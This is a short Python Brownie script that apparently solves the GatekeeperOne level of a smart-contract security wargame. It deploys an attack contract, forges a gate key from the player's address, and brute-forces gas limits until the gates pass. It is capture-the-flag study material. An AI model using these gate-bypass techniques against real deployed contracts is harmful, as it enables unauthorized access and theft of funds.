from brownie import (
    network,
    accounts,
    config,
    interface,
    exceptions,
    Contract,
    GatekeeperOneAttack,
)
from scripts.helpful_scripts import (
    get_account,
    get_new_instance,
    submit_instance,
)
from web3 import Web3


def main():
    player = get_account()
    instance_address = get_new_instance(level_id=13, player=player)

    gatekeeper_contract = interface.IGatekeeperOne(instance_address)
    attack_contract = GatekeeperOneAttack.deploy(gatekeeper_contract, {"from": player})

    print(player)
    player_bytes = Web3.toBytes(hexstr=str(player))
    gate_key = Web3.toBytes(hexstr=f'0x000011110000{str(player)[-4:]}')
    print(f'player address: {player_bytes}')
    print(f'gate key: {gate_key}')
    print()

    print("Gate three values:")
    for value in attack_contract.getGateThreeValues(gate_key):
       print(Web3.toBytes(value)) 
    print()

    for i in range(9):
        initial_gas_limit = 55_000 + i * 1000
        print(f'Initial gas limit {initial_gas_limit}')
        tx = attack_contract.attack(gate_key, initial_gas_limit, {"from": player, "gas_limit": 6721975})
        tx.wait(1)
        if tx.events['AttackAttempt'][-1]['extraGasLimit'] < 999:
            break

    submit_instance(instance_address, player)
